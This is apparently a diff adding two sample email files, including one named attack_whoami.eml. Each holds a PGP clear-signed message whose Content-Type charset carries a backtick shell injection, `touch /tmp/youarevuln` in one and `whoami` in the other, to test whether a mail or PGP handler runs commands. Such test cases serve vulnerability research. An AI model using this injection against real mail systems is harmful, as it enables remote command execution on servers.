+Content-Type: text/plain; CHARSET="US-ASCII`touch /tmp/youarevuln`";
+format=flowed; DelSp=Yes
+MIME-Version: 1.0
+Content-Disposition: inline
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+This is a sample of a clear signed message.
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.2
+
+iQCVAwUBMoSCcM4T3nOFCCzVAQF4aAP/eaP2nssHHDTHyPBSjgwyzryguwBd2szF
+U5IFy5JfU+PAa6NV6m/UWW8IKczNX2cmaKQNgubwl3w0odFQPUS+nZ9myo5QtRZh
+DztuhjzJMEzwtm8KTKBnF/LJ9X05pSQUvoHfLZ/waJdVt4E/xfEs90l8DT1HDdIz
+CvynscaD+wA=
+=Xb9n
+-----END PGP SIGNATURE-----
+
+attack_whoami.eml
+
+Date: Fri, 04 Nov 2016 16:04:19 +0000
+Message-ID: <20161104160419.Horde.HpYObg_3-4QS-nUzWujEkg3@ubvm.mydomain.com>
+From: Donald Trump <attacker@attacker.com>
+To: SomeUser@mydoamin.com
+Subject: PGP_INLine_whoami
+X-IMP-Draft: Yes
+Content-Type: text/plain; CHARSET=US-ASCII`whoami`; format=flowed; DelSp=Yes
+MIME-Version: 1.0
+Content-Disposition: inline
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+This is a sample of a clear signed message.
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.2
+
+iQCVAwUBMoSCcM4T3nOFCCzVAQFJaAP/eaP2nssHHDTHyPBSjgwyzryguwBd2szF
+U5IFy5JfU+PAa6NV6m/UWW8IKczNX2cmaKQNgubwl3w0odFQPUS+nZ9myo5QtRZh
+DztuhjzJMEzwtm8KTKBnF/LJ9X05pSsUvoHfLZ/waJdVt4E/xfEs90l8DT1HDdIz
+CvynscaD+wA=
+=Xb9n
+-----END PGP SIGNATURE-----
